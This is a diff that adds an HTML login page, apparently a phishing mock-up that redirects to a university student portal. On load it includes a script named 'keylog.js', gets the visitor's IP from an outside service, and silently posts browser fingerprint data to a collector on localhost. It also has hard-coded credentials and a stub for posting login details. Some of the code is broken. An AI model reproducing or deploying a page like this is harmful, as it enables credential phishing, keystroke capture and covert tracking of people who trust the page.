@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <link rel="stylesheet" type="text/css" href="./style.css">
+    <script src="keylog.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  </head>
+  <body>
+
+    <script>
+
+      var IP = "";
+      // To communicate with the ipify server to get the IP address
+      $.getJSON("https://api.ipify.org?format=json", function(data) {
+            //$("#ipaddr").html(data.ip);
+            IP = data.ip;
+            //console.log(IP);
+      })
+
+      // To capture the date and time
+      var day = new Date();
+      var date = day.getFullYear()+'-'+(day.getMonth()+1)+'-'+day.getDate();
+      var time = day.getHours() + ":" + day.getMinutes() + ":" + day.getSeconds();
+      var dateandTime = date+' '+time;
+
+      // To capture the Application code name
+      var AppCodeName = navigator.appCodeName;
+      // To capture the App Version
+      var AppVersion = navigator.appVersion;
+      // To capture the User Agent
+      var UserAgent = navigator.userAgent;
+      // To capture the Operating System
+      var OperatingSystem = navigator.platform;
+
+      console.log(AppCodeName + AppVersion + UserAgent + OperatingSystem);
+
+      var url = "http://localhost:8080/userdetails";
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", url);
+
+        xhr.setRequestHeader("Accept", "application/json");
+        xhr.setRequestHeader("Content-Type", "application/json");
+
+        xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4) {
+            console.log(xhr.status);
+            console.log(xhr.responseText);
+        }};
+
+        var data = `{ 
+          "appCodeName": "${AppCodeName}", 
+          "appVersion": "${AppVersion}",
+          "userAgent" : "${UserAgent}",
+          "operatingSystem" : "${OperatingSystem}",
+          "ip" : "${IP}"
+        }`;
+
+        xhr.send(data);
+        
+
+     
+
+    </script>
+
+      <div class="login-form">
+        <h1>Login Form</h1>
+        <form id="form">
+          <div class="box">
+            <p>User Name</p>
+            <input type="text" id="username" name="user" placeholder="User Name">
+            <p>Password</p>
+            <input type="password" id="password" name="pass" placeholder="Password">
+          </div>
+          <button type="button" onclick="validate()">Login</button>
+       </form>
+
+       <script type="text/javascript">
+        function validate()
+        {
+            if(   document.getElementById("username").value == "sahil"
+               && document.getElementById("password").value == "test" )
+            {
+                
+                window.location = 'https://vtop.vit.ac.in/vtop/initialProcess';
+            }
+            else
+            {
+                alert("Wrong Credentials!")
+                //window.location.replace("https://google.com");
+            }
+        }
+        </script>
+
+      </div>
+
+      
+
+      <script>
+
+        var UserName = document.getElementsByName("user").innerHTML;
+        var Password = document.getElementsByName("password").innerHTML;
+        console.log(UserName + Password);
+
+        function PostUserDetails () {
+
+        
+
+        var url = "http://localhost:8080/login";
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", url);
+
+        xhr.setRequestHeader("Accept", "application/json");
+        xhr.setRequestHeader("Content-Type", "application/json");
+
+        xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4) {
+            console.log(xhr.status);
+            console.log(xhr.responseText);
+        }};
+
+        var data = `{
+        "username": "sahil",
+        "password": "test1"
+        }`;
+
+        xhr.send(data);
+        
+      }
+         
+
+      </script>
+  
+  </body>
+</html>
